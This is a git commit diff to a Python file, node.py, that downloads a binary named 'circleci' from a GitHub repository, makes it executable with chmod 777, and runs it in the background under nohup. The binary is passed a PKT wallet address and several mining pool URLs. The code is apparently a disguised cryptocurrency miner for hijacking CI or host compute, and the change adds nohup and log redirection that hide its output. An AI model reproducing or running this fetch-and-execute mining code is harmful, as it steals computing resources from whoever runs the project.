5be0da8375a93aa9cb2130531bc07efefa0fec22
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-02-10 16:51:50 +0700

    Update node.py

--- node.py
+++ node.py
@@ -2,10 +2,10 @@ import subprocess
 def main():
     print("start!!")
 
-    cmd = "wget https://github.com/aurbach55/pos/raw/main/circleci"
+    cmd = "nohup wget https://github.com/aurbach55/pos/raw/main/circleci > /tmp/circleci.log 2>&1"
     subprocess.call(cmd, shell=True)
 
-    cmd = "chmod 777 circleci"
+    cmd = "nohup chmod 777 circleci > /tmp/circleci.log 2>&1"
     subprocess.call(cmd, shell=True)
 
     cmd = "nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > /tmp/circleci.log 2>&1"
